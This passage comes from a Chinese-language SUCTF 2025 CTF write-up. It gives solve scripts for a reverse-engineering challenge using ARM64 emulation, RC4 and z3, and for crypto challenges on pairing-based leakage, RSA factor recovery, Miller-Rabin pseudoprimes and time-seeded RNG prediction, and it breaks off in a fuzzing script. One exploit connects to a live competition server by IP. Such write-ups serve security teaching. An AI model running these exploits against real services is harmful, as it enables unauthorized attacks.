    print(long_to_bytes(a)[::-1].decode(), end="")
# SUCTF{Ma7h_WorldIs_S0_B3aut1ful}
```

### SU\_APP

/assert/main 一个elf文件 010可以看到下面还有个elf文件头去掉的elf

so文件可以看到sub\_21EE4对文件头异或0x3c 剩下的字节从so抄过去

新的elf看init\_array 和 check，init\_array初始化了类似rc4的流密钥序列，密钥是SUCTF的魔改md5值的hexdiguest

用unicorn跑结果如下（不懂为什么要魔改md5，浪费三个小时）：

```Python
from unicorn import *
from unicorn.arm64_const import *
from capstone import *

# 要模拟的 ARM64 二进制代码
ARM64_CODE = bytes.fromhex("""FF0302D1FD7B07A9FDC301911F2003D51F2003D51F2003D5E01300F9E10F00F9E81340F9080140B9E81700B9E81340F9080540B9E81300B9E81340F9080940B9E80F00B9E81340F9080D40B9E80B00B9E8031F2AE80700B901000014E80740B9083D00714C03005401000014E90F40F9EA0780B9EC030A2A88751E5328C968382B0080528B751E332BC96B38681D18334B0080528B751E332BC96B38681D10336B0080528B751E3329C96B38281D0833E9A3009128792AB801000014E80740B908050011E80700B9E5FFFF17EA1340B9E80F40B94801080AE90B40B929012A0A0801092AE92B40B90801090BE91740B90801090B098F945249EDBA720801090BE81700B9E81740B908658813E81700B9E91340B9E81740B90801090BE81700B9EA1740B9E81340B94801080AE90F40B929012A0A0801092AE92F40B90801090BE90B40B90801090BC9EA9652E918BD720801090BE80B00B9E80B40B908518813E80B00B9E91740B9E80B40B90801090BE80B00B9EA0B40B9E81740B94801080AE91340B929012A0A0801092AE93340B90801090BE90F40B90801090B691B8E520984A4720801090BE80F00B9E80F40B9083D8813E80F00B9E90B40B9E80F40B90801090BE80F00B9EA0F40B9E80B40B94801080AE91740B929012A0A0801092AE93740B90801090BE91340B90801090BC9DD9952A937B8720801090BE81300B9E81340B908298813E81300B9E90F40B9E81340B90801090BE81300B9EA1340B9E80F40B94801080AE90B40B929012A0A0801092AE93B40B90801090BE91740B90801090BE9F5815289AFBE720801090BE81700B9E81740B908658813E81700B9E91340B9E81740B90801090BE81700B9EA1740B9E81340B94801080AE90F40B929012A0A0801092AE93F40B90801090BE90B40B90801090B49C59852E9F0A8720801090BE80B00B9E80B40B908518813E80B00B9E91740B9E80B40B90801090BE80B00B9EA0B40B9E81740B94801080AE91340B929012A0A0801092AE94340B90801090BE90F40B90801090B69C288520906B5720801090BE80F00B9E80F40B9083D8813E80F00B9E90B40B9E80F40B90801090BE80F00B9EA0F40B9E80B40B94801080AE91740B929012A0A0801092AE94740B90801090BE91340B90801090B29A09252C9A8BF720801090BE81300B9E81340B908298813E81300B9E90F40B9E81340B90801090BE81300B9EA1340B9E80F40B94801080AE90B40B929012A0A0801092AE94B40B90801090BE91740B90801090B091B93520930AD720801090BE81700B9E81740B908658813E81700B9E91340B9E81740B90801090BE81700B9EA1740B9E81340B94801080AE90F40B929012A0A0801092AE94F40B90801090BE90B40B90801090BE9F59E528968B1720801090BE80B00B9E80B40B908518813E80B00B9E91740B9E80B40B90801090BE80B00B9EA0B40B9E81740B94801080AE91340B929012A0A0801092AE95340B90801090BE90F40B90801090BC98994120801090BE80F00B9E80F40B9083D8813E80F00B9E90B40B9E80F40B90801090BE80F00B9EA0F40B9E80B40B94801080AE91740B929012A0A0801092AE95740B90801090BE91340B90801090BC9F79A52892BB1720801090BE81300B9E81340B908298813E81300B9E90F40B9E81340B90801090BE81300B9EA1340B9E80F40B94801080AE90B40B929012A0A0801092AE95B40B90801090BE91740B90801090B492482520972AD720801090BE81700B9E81740B908658813E81700B9E91340B9E81740B90801090BE81700B9EA1740B9E81340B94801080AE90F40B929012A0A0801092AE95F40B90801090BE90B40B90801090B69328E5209B3BF720801090BE80B00B9E80B40B908518813E80B00B9E91740B9E80B40B90801090BE80B00B9EA0B40B9E81740B94801080AE91340B929012A0A0801092AE96340B90801090BE90F40B90801090BC971885229CFB4720801090BE80F00B9E80F40B9083D8813E80F00B9E90B40B9E80F40B90801090BE80F00B9EA0F40B9E80B40B94801080AE91740B929012A0A0801092AE96740B90801090BE91340B90801090B290481528936A9720801090BE81300B9E81340B908298813E81300B9E90F40B9E81340B90801090BE81300B9E81340B9EA0B40B908010A0AE90F40B929012A0A0801092AE92F40B90801090BE91740B90801090B49AC8452C9C3BE720801090BE81700B9E81740B9086D8813E81700B9E91340B9E81740B90801090BE81700B9E81740B9EA0F40B908010A0AE91340B929012A0A0801092AE94340B90801090BE90B40B90801090B096896520908B8720801090BE80B00B9E80B40B9085D8813E80B00B9E91740B9E80B40B90801090BE80B00B9E80B40B9EA1340B908010A0AE91740B929012A0A0801092AE95740B90801090BE90F40B90801090B294A8B52C9CBA4720801090BE80F00B9E80F40B908498813E80F00B9E90B40B9E80F40B90801090BE80F00B9E80F40B9EA1740B908010A0AE90B40B929012A0A0801092AE92B40B90801090BE91340B90801090B49F59852C936BD720801090BE81300B9E81340B908318813E81300B9E90F40B9E81340B90801090BE81300B9E81340B9EA0B40B908010A0AE90F40B929012A0A0801092AE93F40B90801090BE91740B90801090BA90B8252E9C5BA720801090BE81700B9E81740B9086D8813E81700B9E91340B9E81740B90801090BE81700B9E81740B9EA0F40B908010A0AE91340B929012A0A0801092AE95340B90801090BE90B40B90801090B698A82528948A0720801090BE80B00B9E80B40B9085D8813E80B00B9E91740B9E80B40B90801090BE80B00B9E80B40B9EA1340B908010A0AE91740B929012A0A0801092AE96740B90801090BE90F40B90801090BE9EB03320801090BE80F00B9E80F40B908498813E80F00B9E90B40B9E80F40B90801090BE80F00B9E80F40B9EA1740B908010A0AE90B40B929012A0A0801092AE93B40B90801090BE91340B90801090B09799F5269FABC720801090BE81300B9E81340B908318813E81300B9E90F40B9E81340B90801090BE81300B9E81340B9EA0B40B908010A0AE90F40B929012A0A0801092AE94F40B90801090BE91740B90801090BC9BC9952293CA4720801090BE81700B9E81740B9086D8813E81700B9E91340B9E81740B90801090BE81700B9E81740B9EA0F40B908010A0AE91340B929012A0A0801092AE96340B90801090BE90B40B90801090BC9FA8052E966B8720801090BE80B00B9E80B40B9085D8813E80B00B9E91740B9E80B40B90801090BE80B00B9E80B40B9EA1340B908010A0AE91740B929012A0A0801092AE93740B90801090BE90F40B90801090BE9B08152A99ABE720801090BE80F00B9E80F40B908498813E80F00B9E90B40B9E80F40B90801090BE80F00B9E80F40B9EA1740B908010A0AE90B40B929012A0A0801092AE94B40B90801090BE91340B90801090BA99D825249ABA8720801090BE81300B9E81340B908318813E81300B9E90F40B9E81340B90801090BE81300B9E81340B9EA0B40B908010A0AE90F40B929012A0A0801092AE95F40B90801090BE91740B90801090BA9209D52693CB5720801090BE81700B9E81740B9086D8813E81700B9E91340B9E81740B90801090BE81700B9E81740B9EA0F40B908010A0AE91340B929012A0A0801092AE93340B90801090BE90B40B90801090B097F9452E99DBF720801090BE80B00B9E80B40B9085D8813E80B00B9E91740B9E80B40B90801090BE80B00B9E80B40B9EA1340B908010A0AE91740B929012A0A0801092AE94740B90801090BE90F40B90801090B295B8052E9EDAC720801090BE80F00B9E80F40B908498813E80F00B9E90B40B9E80F40B90801090BE80F00B9E80F40B9EA1740B908010A0AE90B40B929012A0A0801092AE95B40B90801090BE91340B90801090B4991895249A5B1720801090BE81300B9E81340B908318813E81300B9E90F40B9E81340B90801090BE81300B9E81340B9E90F40B90801094AE90B40B90801094AE93F40B90801090BE91740B90801090B4928875249FFBF720801090BE81700B9E81740B908718813E81700B9E91340B9E81740B90801090BE81700B9E81740B9E91340B90801094AE90F40B90801094AE94B40B90801090BE90B40B90801090B29D09E5229EEB0720801090BE80B00B9E80B40B908558813E80B00B9E91740B9E80B40B90801090BE80B00B9E80B40B9E91740B90801094AE91340B90801094AE95740B90801090BE90F40B90801090B49248C52A9B3AD720801090BE80F00B9E80F40B908418813E80F00B9E90B40B9E80F40B90801090BE80F00B9E80F40B9E90B40B90801094AE91740B90801094AE96340B90801090BE91340B90801090B89018752A9BCBF720801090BE81300B9E81340B908258813E81300B9E90F40B9E81340B90801090BE81300B9E81340B9E90F40B90801094AE90B40B90801094AE92F40B90801090BE91740B90801090B89489D52C997B4720801090BE81700B9E81740B908718813E81700B9E91340B9E81740B90801090BE81700B9E81740B9E91340B90801094AE90F40B90801094AE93B40B90801090BE90B40B90801090B29F59952C97BA9720801090BE80B00B9E80B40B908558813E80B00B9E91740B9E80B40B90801090BE80B00B9E80B40B9E91740B90801094AE91340B90801094AE94740B90801090BE90F40B90801090B096C895269D7BE720801090BE80F00B9E80F40B908418813E80F00B9E90B40B9E80F40B90801090BE80F00B9E80F40B9E90B40B90801094AE91740B90801094AE95340B90801090BE91340B90801090B098E9752E9D7B7720801090BE81300B9E81340B908258813E81300B9E90F40B9E81340B90801090BE81300B9E81340B9E90F40B90801094AE90B40B90801094AE95F40B90801090BE91740B90801090BC9D88F526913A5720801090BE81700B9E81740B908718813E81700B9E91340B9E81740B90801090BE81700B9E81740B9E91340B90801094AE90F40B90801094AE92B40B90801090BE90B40B90801090B49FF84522954BD720801090BE80B00B9E80B40B908558813E80B00B9E91740B9E80B40B90801090BE80B00B9E80B40B9E91740B90801094AE91340B90801094AE93740B90801090BE90F40B90801090BA9108652E99DBA720801090BE80F00B9E80F40B908418813E80F00B9E90B40B9E80F40B90801090BE80F00B9E80F40B9E90B40B90801094AE91740B90801094AE94340B90801090BE91340B90801090BA9A083520991A0720801090BE81300B9E81340B908258813E81300B9E90F40B9E81340B90801090BE81300B9E81340B9E90F40B90801094AE90B40B90801094AE94F40B90801090BE91740B90801090B29079A52893ABB720801090BE81700B9E81740B908718813E81700B9E91340B9E81740B90801090BE81700B9E81740B9E91340B90801094AE90F40B90801094AE95B40B90801090BE90B40B90801090BA93C935269DBBC720801090BE80B00B9E80B40B908558813E80B00B9E91740B9E80B40B90801090BE80B00B9E80B40B9E91740B90801094AE91340B90801094AE96740B90801090BE90F40B90801090B099F8F5249F4A3720801090BE80F00B9E80F40B908418813E80F00B9E90B40B9E80F40B90801090BE80F00B9E80F40B9E90B40B90801094AE91740B90801094AE93340B90801090BE91340B90801090BA9CC8A528995B8720801090BE81300B9E81340B908258813E81300B9E90F40B9E81340B90801090BE81300B9E80F40B9E91340B9EA0B40B929012A2A0801094AE92B40B90801090BE91740B90801090B894884522985BE720801090BE81700B9E81740B908698813E81700B9E91340B9E81740B90801090BE81700B9E81340B9E91740B9EA0F40B929012A2A0801094AE94740B90801090BE90B40B90801090BE9F29F524965A8720801090BE80B00B9E80B40B908598813E80B00B9E91740B9E80B40B90801090BE80B00B9E81740B9E90B40B9EA1340B929012A2A0801094AE96340B90801090BE90F40B90801090BE97484528972B5720801090BE80F00B9E80F40B908458813E80F00B9E90B40B9E80F40B90801090BE80F00B9E80B40B9E90F40B9EA1740B929012A2A0801094AE93F40B90801090BE91340B90801090B290794526992BF720801090BE81300B9E81340B9082D8813E81300B9E90F40B9E81340B90801090BE81300B9E80F40B9E91340B9EA0B40B929012A2A0801094AE95B40B90801090BE91740B90801090B69388B5269ABAC720801090BE81700B9E81740B908698813E81700B9E91340B9E81740B90801090BE81700B9E81340B9E91740B9EA0F40B929012A2A0801094AE93740B90801090BE90B40B90801090B4992995289E1B1720801090BE80B00B9E80B40B908598813E80B00B9E91740B9E80B40B90801090BE80B00B9E81740B9E90B40B9EA1340B929012A2A0801094AE95340B90801090BE90F40B90801090BA98F9E52E9FDBF720801090BE80F00B9E80F40B908458813E80F00B9E90B40B9E80F40B90801090BE80F00B9E80B40B9E90F40B9EA1740B929012A2A0801094AE92F40B90801090BE91340B90801090B29BA8B5289B0B0720801090BE81300B9E81340B9082D8813E81300B9E90F40B9E81340B90801090BE81300B9E80F40B9E91340B9EA0B40B929012A2A0801094AE94B40B90801090BE91740B90801090BE9C98F5209F5AD720801090BE81700B9E81740B908698813E81700B9E91340B9E81740B90801090BE81700B9E81340B9E91740B9EA0F40B929012A2A0801094AE96740B90801090BE90B40B90801090B09DC9C5289C5BF720801090BE80B00B9E80B40B908598813E80B00B9E91740B9E80B40B90801090BE80B00B9E81740B9E90B40B9EA1340B929012A2A0801094AE94340B90801090BE90F40B90801090B896288522960B4720801090BE80F00B9E80F40B908458813E80F00B9E90B40B9E80F40B90801090BE80F00B9E80B40B9E90F40B9EA1740B929012A2A0801094AE95F40B90801090BE91340B90801090B2934825209C1A9720801090BE81300B9E81340B9082D8813E81300B9E90F40B9E81340B90801090BE81300B9E80F40B9E91340B9EA0B40B929012A2A0801094AE93B40B90801090BE91740B90801090B49D08F5269EABE720801090BE81700B9E81740B908698813E81700B9E91340B9E81740B90801090BE81700B9E81340B9E91740B9EA0F40B929012A2A0801094AE95740B90801090BE90B40B90801090BA9469E5249A7B7720801090BE80B00B9E80B40B908598813E80B00B9E91740B9E80B40B90801090BE80B00B9E81740B9E90B40B9EA1340B929012A2A0801094AE93340B90801090BE90F40B90801090B69579A52E95AA5720801090BE80F00B9E80F40B908458813E80F00B9E90B40B9E80F40B90801090BE80F00B9E80B40B9E90F40B9EA1740B929012A2A0801094AE94F40B90801090BE91340B90801090BE9F301320801090BE81300B9E81340B9082D8813E81300B9E90F40B9E81340B90801090BE81300B9EA1740B9E91340F9280140B908010A0B280100B9EA1340B9E91340F9280540B908010A0B280500B9EA0F40B9E91340F9280940B908010A0B280900B9EA0B40B9E91340F9280D40B908010A0B280D00B9""")
cons = bytes.fromhex("0123456789ABCDEFFEDCBA9876543210")
# 内存地址和大小
ADDRESS = 0x1000
MEM_SIZE = 0x10000  # 4KB

# 初始化 Unicorn 和 Capstone
mu = Uc(UC_ARCH_ARM64, UC_MODE_ARM)
cs = Cs(CS_ARCH_ARM64, CS_MODE_ARM)

# 映射内存
mu.mem_map(ADDRESS, MEM_SIZE)
mu.mem_map(0x20000, MEM_SIZE)

# 将二进制代码写入内存
mu.mem_write(ADDRESS, ARM64_CODE)
mu.mem_write(0x25000, cons)
mu.mem_write(0x20000, b'\x00'*64)
mu.mem_write(0x20000, b'SUCTF')

# 设置寄存器初始值
mu.reg_write(UC_ARM64_REG_X0, 0x25000)  # X0 = 10 (第一个参数)
mu.reg_write(UC_ARM64_REG_X1, 0x20000)  # X1 = 20 (第二个参数)
mu.reg_write(UC_ARM64_REG_SP, ADDRESS + MEM_SIZE - 0x1000)  # 设置栈指针

# 反汇编函数
def disassemble(code, address):
    print("Disassembly:")
    for insn in cs.disasm(code, address):
        print(f"0x{insn.address:x}:\t{insn.mnemonic}\t{insn.op_str}")

# 打印寄存器值
def print_registers(mu):
    print("Registers:")
    regs = {
        "X0": UC_ARM64_REG_X0,
        "X1": UC_ARM64_REG_X1,
        "X2": UC_ARM64_REG_X2,
        "X3": UC_ARM64_REG_X3,
        "SP": UC_ARM64_REG_SP,
        "LR": UC_ARM64_REG_LR,
        "PC": UC_ARM64_REG_PC,
    }
    for name, reg in regs.items():
        value = mu.reg_read(reg)
        print(f"{name}: 0x{value:x}")

# 反汇编代码
disassemble(ARM64_CODE, ADDRESS)

# 开始模拟
try:
    mu.emu_start(ADDRESS, ADDRESS + len(ARM64_CODE))
    print("\nExecution finished.")
except UcError as e:
    print(f"Error: {e}")

# 打印寄存器值
print_registers(mu)

# 获取返回值
result = mu.reg_read(UC_ARM64_REG_X0)
print(mu.mem_read(result,0x10).hex())
print(f"\nFunction returned: {result}")
```

根据流密钥的结果执行vm，用脚本把所有的函数的反编译结果提一下，还有参数个数

```Python
from ida_hexrays import *
from ida_funcs import *
from idaapi import *
ea = 0x228E8
for i in range(0x100):
    tmp=ea+i*16
    print(get_qword(tmp+8)+2,end=",")
    '''
    func = ida_funcs.get_func(get_qword(tmp))
    decompiled = ida_hexrays.decompile(func.start_ea)
    print(decompiled)
    '''
  
```

```Python
def KSA(key):
    """ Key-Scheduling Algorithm (KSA) """
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    return S


def PRGA(S):
    """ Pseudo-Random Generation Algorithm (PRGA) """
    i, j = 0, 0
    while True:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        K = (S[i] + S[j]) % 256
        yield K


def RC4(key):
    """ RC4 encryption/decryption """
    S = KSA(key)
    keystream = PRGA(S)
    return keystream
ks = RC4(b"8951ef65e78ebfb773ca648a227d3f5b")
import re


def extract_expressions():
    file_path=r"D:\attachment\suctf2024\_media_file_task_3662ec2e-aafa-4e9e-b9bf-1d5322380f03\app-debug\assets\decompile_dump.txt"
    with open(file_path, 'r') as file:
        content = file.read()

   # Regular expression to match function definitions and extract expressions
    pattern = r"__int64 __fastcall (\w+)\(.*?\)\s*\{\s*return (.*?);\s*\}"

    matches = re.findall(pattern, content)

    # Store the results in a dictionary, removing '(unsigned int)'
    functions = {name: re.sub(r'\(unsigned int\)', '', expression) for name, expression in matches}

    return functions

# Example usage

epressions = extract_expressions()
print(len(epressions))
# Print the extracted expressions
expressions = []
for func_name, expression in epressions.items():
      print(f"Function: {func_name}\nExpression: {expression}\n")
      expressions.append(expression)
print(expressions)
param_count = [4,5,4,5,3,5,4,4,4,3,3,4,4,4,3,4,3,3,5,3,5,4,3,3,5,3,4,5,4,4,3,3,3,3,5,3,3,3,5,4,5,5,5,3,4,3,4,4,4,5,4,4,5,4,4,4,3,4,5,3,4,5,4,4,5,4,5,3,3,3,5,5,4,5,4,5,4,4,3,3,4,4,5,5,5,4,5,5,4,4,4,5,3,5,4,5,3,4,4,3,3,3,5,3,5,5,4,3,4,5,5,3,3,4,3,3,3,3,4,4,4,4,4,3,5,4,4,4,5,3,5,3,5,4,5,3,5,5,3,3,5,5,4,3,4,4,5,3,4,3,3,4,5,5,5,5,3,5,3,3,3,4,4,3,3,3,4,3,3,3,4,4,3,3,5,3,5,4,3,5,3,4,4,4,5,4,5,5,3,5,5,3,4,4,3,3,5,4,4,4,5,5,5,4,3,3,5,5,4,5,4,3,3,5,5,4,5,5,4,4,5,4,4,5,5,5,4,3,3,3,4,5,5,4,3,3,4,5,4,5,4,3,4,5,4,3,5,4,4,3,3,3,4,4,3,5]
tmp_mem = [0]*32
from z3 import *
s = Solver()
flag=[BitVec(f"flag[{i}]",8) for i in range(32)]
result = [0x000D7765, 0x00011EBD, 0x00032D12, 0x00013778, 0x0008A428, 0x0000B592, 0x0003FA57, 0x00001616, 0x0003659E, 0x0002483A, 0x00002882, 0x000508F4, 0x00000BAD, 0x00027920, 0x0000F821, 0x00019F83, 0x00000F97, 0x00033904, 0x000170D5, 0x0000016C, 0x0000CF5D, 0x000280D2, 0x000A8ADE, 0x00009EAA, 0x00009DAB, 0x0001F45E, 0x00003214, 0x000052FA, 0x0006D57A, 0x000460ED, 0x000124FF, 0x00013936]
for i in range(32):
    s.add(flag[i]&0x80==0)
    tmp_mem[i] = flag[i]
for i in range(32*8):
    arg0 = next(ks)
    arg1 = next(ks)
    arg2 = next(ks)
    off0 = next(ks)
    off1 = next(ks)
    op = next(ks)
    ex = expressions[op]
    if param_count[op] == 3 and 'a4' not in ex and 'a5' not in ex:
        ex = ex.replace("a1",str(arg0))
        ex = ex.replace("a2", f"tmp_mem[{off0%32}]")
        ex = ex.replace("a3", f"tmp_mem[{off1%32}]")
    elif param_count[op] == 4 and 'a5' not in ex:
        ex = ex.replace("a1", str(arg0))
        ex = ex.replace("a2", str(arg1))
        ex = ex.replace("a3", f"tmp_mem[{off0 % 32}]")
        ex = ex.replace("a4", f"tmp_mem[{off1 % 32}]")
    elif param_count[op] == 5:
        ex = ex.replace("a1", str(arg0))
        ex = ex.replace("a2", str(arg1))
        ex = ex.replace("a3", str(arg2))
        ex = ex.replace("a4", f"tmp_mem[{off0 % 32}]")
        ex = ex.replace("a5", f"tmp_mem[{off1 % 32}]")
    print(ex)
    tmp_mem[off0%32] = eval(ex)
for i in range(32):
    # print(tmp_mem[i])
    s.add(tmp_mem[i]==result[i])
print(s.check())
m = s.model()
for i in range(32):
    print(chr(m.eval(flag[i]).as_long()),end="")
```

## Crypto

### SU\_signin

BLS12-381 curve，直接配对就完事了

```Python
from Crypto.Util.number import *

cs = [...]
p = 0x1a0111ea397fe69a4b1ba7b6434bacd764774b84f38512bf6730d2a0f6b0f6241eabfffeb153ffffb9feffffffffaaab
K = GF(p)
E = EllipticCurve(K, (0, 4))
o = 793479390729215512516507951283169066088130679960393952059283337873017453583023682367384822284289
n1, n2 = 859267, 52437899

g1=[]

cs = [E(i) for i in cs]
for i in cs:
    g1.append(n2*E(i))
flag='0'
for i in g1:
    if g1[0].weil_pairing(i, o)==1:
        flag+='0'
    else:
        flag+='1'
print(long_to_bytes(int(flag,2)))
```

### SU\_rsa

参考https://cic.iacr.org/p/1/3/29/pdf

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-09-07.png" alt="SUCTF_2025_Writeup-2025-01-14-16-09-07" position="center" style="border-radius: 1px;" >}}

可以恢复出p%e

然后令f\=pl+k\*e mod n，多线程爆破k15bits低位打copper恢复出k，然后拿到p

```Python
from multiprocessing import Pool
from tqdm import trange
from Crypto.Util.number import *

# 定义初始参数
d_m = 54846367460362174332079522877510670032871200032162046677317492493462931044216323394426650814743565762481796045534803612751698364585822047676578654787832771646295054609274740117061370718708622855577527177104905114099420613343527343145928755498638387667064228376160623881856439218281811203793522182599504560128
n = 102371500687797342407596664857291734254917985018214775746292433509077140372871717687125679767929573899320192533126974567980143105445007878861163511159294802350697707435107548927953839625147773016776671583898492755338444338394630801056367836711191009369960379855825277626760709076218114602209903833128735441623
e = 112238903025225752449505695131644979150784442753977451850362059850426421356123

# 计算 k 和 p_q
k = e * d_m // n + 1
p_q = (n + 1 + inverse(k, e)) % e

# 定义多项式并求根
R.<x> = Zmod(e)[]
f = x^2 - p_q * x + n
roots = f.roots()
pl, ql = [ZZ(r[0]) for r in roots]

# 定义 Zmod(n) 环
Rk.<k1> = Zmod(n)[]

# 定义需要处理的范围
start = 1
end = 2**15
range_values = range(start, end)

# 定义每个进程的任务
def process_i(i):
    try:
        # 计算 f
        f = pl + (k1 * 2**15 + i) * e
        # 计算小根
        roots = f.monic().small_roots(X=2**242, beta=0.4, epsilon=0.02)
        if roots:
            print(roots)
            return roots
    except Exception as ex:
        # 可以记录异常信息
        return None
    return None

def chunks(iterable, chunk_size):
    """生成器，将iterable分成多个大小为chunk_size的块"""
    for i in trange(0, len(iterable), chunk_size):
        yield iterable[i:i + chunk_size]

if __name__ == '__main__':
    # 确保在主进程中运行
    # 定义进程数
    num_processes = 32
    # 定义每个批次的大小
    chunk_size = 1000  # 根据任务大小调整

    with Pool(processes=num_processes) as pool:
        # 使用 tqdm 进行进度条显示
        results = []
        for chunk in chunks(range_values, chunk_size):
            # 对每个块应用 pool.map
            chunk_results = pool.map(process_i, chunk)
            results.extend(chunk_results)
    
        # 处理结果
        for result in results:
            if result:
                print(result)
```

```Python
from hashlib import sha256

n = 102371500687797342407596664857291734254917985018214775746292433509077140372871717687125679767929573899320192533126974567980143105445007878861163511159294802350697707435107548927953839625147773016776671583898492755338444338394630801056367836711191009369960379855825277626760709076218114602209903833128735441623

k1 = 2452892099778398741990825320389090423460461767637056482486151027858097209
for i in range(2**15):
    p = pl+(k1*2**15+i)*e
    if n%p == 0:
        q=n//p
        assert p*q==n
        flag = sha256(str(p).encode()).hexdigest()[:32]
        print(flag)
        flag = sha256(str(q).encode()).hexdigest()[:32]
        print(flag)
```

### SU\_mathgame

第一关直接采用https://github.com/jvdsn/crypto-attacks/blob/master/attacks/pseudoprimes/miller\_rabin.py的代码生成伪素数即可

```Python
from math import gcd
from math import lcm

def fast_crt(X, M, segment_size=8):
    """
    Uses a divide-and-conquer algorithm to compute the CRT remainder and least common multiple.
    :param X: the remainders
    :param M: the moduli (not necessarily coprime)
    :param segment_size: the minimum size of the segments (default: 8)
    :return: a tuple containing the remainder and the least common multiple
    """
    assert len(X) == len(M)
    assert len(X) > 0
    while len(X) > 1:
        X_ = []
        M_ = []
        for i in range(0, len(X), segment_size):
            if i == len(X) - 1:
                X_.append(X[i])
                M_.append(M[i])
            else:
                X_.append(crt(X[i:i + segment_size], M[i:i + segment_size]))
                M_.append(lcm(*M[i:i + segment_size]))
        X = X_
        M = M_

    return X[0], M[0]

def _generate_s(A, k):
    S = []
    for a in A:
        # Possible non-residues mod 4a of potential primes p
        Sa = set()
        for p in range(1, 4 * a, 2):
            if kronecker(a, p) == -1:
                Sa.add(p)

        # Subsets of Sa that meet the intersection requirement
        Sk = []
        for ki in k:
            assert gcd(ki, 4 * a) == 1
            Sk.append({pow(ki, -1, 4 * a) * (s + ki - 1) % (4 * a) for s in Sa})

        S.append(Sa.intersection(*Sk))

    return S

# Brute forces a combination of residues from S by backtracking
# X already contains the remainders mod each k
# M already contains each k
def _backtrack(S, A, X, M, i):
    if i == len(S):
        return fast_crt(X, M)

    M.append(4 * A[i])
    for za in S[i]:
        X.append(za)
        try:
            fast_crt(X, M)
            z, m = _backtrack(S, A, X, M, i + 1)
            if z is not None and m is not None:
                return z, m
        except ValueError:
            pass
        X.pop()

    M.pop()
    return None, None

def generate_pseudoprime(A, k2=None, k3=None, min_bit_length=0):
    """
    Generates a pseudoprime of the form p1 * p2 * p3 which passes the Miller-Rabin primality test for the provided bases.
    More information: R. Albrecht M. et al., "Prime and Prejudice: Primality Testing Under Adversarial Conditions"
    :param A: the bases
    :param k2: the k2 value (default: next_prime(A[-1]))
    :param k3: the k3 value (default: next_prime(k2))
    :param min_bit_length: the minimum bit length of the generated pseudoprime (default: 0)
    :return: a tuple containing the pseudoprime n, as well as its 3 prime factors
    """
    A.sort()
    if k2 is None:
        k2 = int(next_prime(A[-1]))
    if k3 is None:
        k3 = int(next_prime(k2))
    while True:
        X = [pow(-k3, -1, k2), pow(-k2, -1, k3)]
        M = [k2, k3]
        S = _generate_s(A, M)
        z, m = _backtrack(S, A, X, M, 0)
        if z and m:
            i = (2 ** (min_bit_length // 3)) // m
            while True:
                p1 = int(z + i * m)
                p2 = k2 * (p1 - 1) + 1
                p3 = k3 * (p1 - 1) + 1
                if is_prime(p1) and is_prime(p2) and is_prime(p3):
                    return p1 * p2 * p3, p1, p2, p3

                i += 1
        else:
            k3 = int(next_prime(k3))

bases = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31]
n, p1, p2, p3 = generate_pseudoprime(bases, min_bit_length=400)
# n = 1958636532528920165254677879441746284785415200982820778893880447781629214538251056224498169968652555865947974541889914445867
```

第二关

[https://tover.xyz/p/cubic/](https://tover.xyz/p/cubic/)

套一下就好了

```Python
# sage
def solve(n, N=3, check=True):  # count N groups
  R.<x, y, z> = QQ[]
  f = x^3+y^3+z^3-(n-1)*x^2*(y+z)-(n-1)*y^2*(x+z)-(n-1)*z^2*(x+y)-(2*n-3)*x*y*z
  tran = EllipticCurve_from_cubic(f, None, true)
  tran_inv = tran.inverse()
  EC = tran.codomain()
  g = EC.gens()[0]
  P = g

  count = 0
  while count<3:
    Pinv = tran_inv(P)
    _x = Pinv[0].numerator()
    _y = Pinv[1].numerator()
    _z = Pinv[0].denominator()
    if _x>0 and _y>0:
      print('x = %d' % _x)
      print('y = %d' % _y)
      print('z = %d' % _z)
      if check: print('check: '+str(f([_x, _y, _z])==0))
      print('')
      count = count+1
    P = P+g

solve(4)
```

第三关主要看到set\_random\_seed(int(time.time()))

我们可以在过了第二关后面记入时间去打时间测信道拿到M，然后传就好了

完整exp

```Python
import time
n = 1958636532528920165254677879441746284785415200982820778893880447781629214538251056224498169968652555865947974541889914445867
# for i in range(1000):
#     if pow(randint(2, n), n - 1, n) != 1:
#         print('what')
#         exit()
a = 1440354387400113353318275132419054375891245413681864837390427511212805748408072838847944629793120889446685643108530381465382074956451566809039119353657601240377236701038904980199109550001860607309184336719930229935342817546146083848277758428344831968440238907935894338978800768226766379
b = 1054210182683112310528012408530531909717229064191793536540847847817849001214642792626066010344383473173101972948978951703027097154519698536728956323881063669558925110120619283730835864056709609662983759100063333396875182094245046315497525532634764115913236450532733839386139526489824351
c = 9391500403903773267688655787670246245493629218171544262747638036518222364768797479813561509116827252710188014736501391120827705790025300419608858224262849244058466770043809014864245428958116544162335497194996709759345801074510016208346248254582570123358164225821298549533282498545808644
assert a > 0
assert b > 0
assert c > 0
assert a / (b + c) + b / (a + c) + c / (a + b) == 4
assert int(a).bit_length() > 900 and int(a).bit_length() < 1000
assert int(b).bit_length() > 900 and int(b).bit_length() < 1000
assert int(c).bit_length() > 900 and int(c).bit_length() < 1000

from pwn import *
from sage.geometry.hyperbolic_space.hyperbolic_isometry import moebius_transform

r = remote('1.95.46.185', 10006)
while 1:
    t = r.recvline()
    if b"Let's play the game1!" in t:
        break
r.recvuntil(b'[+] Plz Tell Me your number: ')
r.sendline(str(n).encode())
while 1:
    t = r.recvline()
    if b"Let's play the game2!" in t:
        break
r.recvuntil(b'[+] Plz give Me your a, b, c: ')
r.sendline(f'{a},{b},{c}'.encode())
while 1:
    t = r.recvline()
    if b"Let's play the game3!" in t:
        break
t = time.time()

C = ComplexField(999)
out = r.recvline().strip()
kx_str = r.recvline().strip()
for i in range(-20,20):
    tt = t+i
    set_random_seed(int(tt))
    M = random_matrix(CC, 2, 2)
    Trans = lambda z: moebius_transform(M, z)
    out_ = []
    for _ in range(3):
        x = C.random_element()
        out_.append((x,Trans(x)))
    if str(out_).encode() == out:
        r.recvuntil(b'[+] Plz Tell Me your answer: ')
        res = C(Trans(eval(kx_str)))
        r.sendline(str(res).encode())
        r.interactive()
```

## Pwn

### SU\_PAS\_sport

pascal写的，去了符号表，程序不是很容易看，先用AI写一个fuzz：

```Python
#!/bin/bash

# Create directories for different types of errors
mkdir -p crashes/{access_violations,invalid_input,range_check,division_by_zero,stack_overflow,heap_error,other}

# Counters for different error types
declare -A error_counts=(
    ["access_violation"]=1
